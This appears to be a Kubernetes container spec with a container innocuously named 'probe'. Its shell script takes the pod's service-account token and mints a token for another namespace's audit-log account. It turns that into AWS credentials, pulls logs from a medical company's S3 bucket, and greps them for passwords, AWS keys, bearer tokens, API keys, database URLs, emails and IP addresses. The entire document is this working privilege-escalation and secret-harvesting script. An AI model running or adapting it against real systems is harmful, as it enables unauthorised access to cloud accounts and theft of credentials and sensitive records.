containers.name: probe
args:
#!/bin/sh
set -u
ENV=stage
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I2954C_START env=$ENV utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq gzip >/tmp/apk.log 2>&1; echo "apk_rc=$?"
export AWS_DEFAULT_REGION=us-west-2
NS=audit-log; SAN=audit-log-sa
SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN")
R=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
WT=$(echo "$TK" | jq -r '.status.token // empty')
RES=$(aws sts assume-role-with-web-identity --role-arn "$R" --role-session-name i2954c --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>/tmp/ae)
echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $(head -c 200 /tmp/ae)"; exit 0; }
export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken')
echo "ASSUME_OK"
LOGB="lazamedical-${ENV}01-usw2-log-bucket"
for P in de-identifier metadata-extraction s3-ingestion; do
  PRE="logs/shifamed-$P-app/"
  aws s3api list-objects-v2 --bucket "$LOGB" --prefix "$PRE" --max-keys 100 --region us-west-2 --output json >/tmp/l 2>/tmp/e || { echo "PREFIX_NO $P"; continue; }
  echo "===PREFIX $P n=$(jq '.KeyCount' /tmp/l) trunc=$(jq '.IsTruncated' /tmp/l)"
  echo "PODS $(jq -r '.Contents[]?|.Key' /tmp/l | awk -F/ '{print $2}' | sort | uniq -c | tr '\n' ' ')"
  echo "TIME $(jq -r '.Contents[]?|.LastModified' /tmp/l | sort | head -1) .. $(jq -r '.Contents[]?|.LastModified' /tmp/l | sort | tail -1)"
  BIG=$(jq -r '.Contents[]?|"\(.Size)|\(.Key)"' /tmp/l | awk -F'|' '$1+0<=2097152' | sort -t'|' -k1 -n | tail -1)
  echo "BIGGEST $BIG"
  K=$(echo "$BIG" | cut -d'|' -f2-)
  [ -z "$K" ] && continue
  if aws s3api get-object --bucket "$LOGB" --key "$K" /tmp/f --region us-west-2 >/tmp/go 2>/tmp/e; then
    if gzip -t /tmp/f 2>/dev/null; then gunzip -c /tmp/f > /tmp/txt 2>/dev/null; else cp /tmp/f /tmp/txt; fi
    echo "SIZE $(wc -c < /tmp/txt) LINES $(wc -l < /tmp/txt)"
    echo "LOGGERS $(grep -o '"logger":"[^"]*"' /tmp/txt | sort | uniq -c | sort -rn | head -8 | tr '\n' ' ')"
    echo "LEVELS $(grep -o '"level":"[^"]*"' /tmp/txt | sort | uniq -c | sort -rn | tr '\n' ' ')"
    echo "MSG_SAMPLE"
    grep -o '"message":"[^"]*"' /tmp/txt | sed 's/"message":"//; s/"$//' | sort | uniq -c | sort -rn | head -14
    echo "HITS"
    grep -aoiE 'password|passwd|secret|AKIA[0-9A-Z]{16}|Bearer [A-Za-z0-9._-]{10,}|api[_-]?key|sk-[A-Za-z0-9]{10,}|xoxb|smtp|mysql://[^ "]*|redis://[^ "]*|postgres://[^ "]*|jdbc:[^ "]*|[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}|[a-z0-9.-]+\.(amazonaws\.com|shifamedcloud\.ai|lazamedical\.ai|onmicrosoft\.com)|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' /tmp/txt 2>/dev/null | sort | uniq -c | sort -rn | head -25
  else
    echo "DL_FAIL $(head -c 160 /tmp/e | tr '\n' ' ')"
  fi
done
echo "===I2954C_DONE $(date -u +%FT%TZ)==="
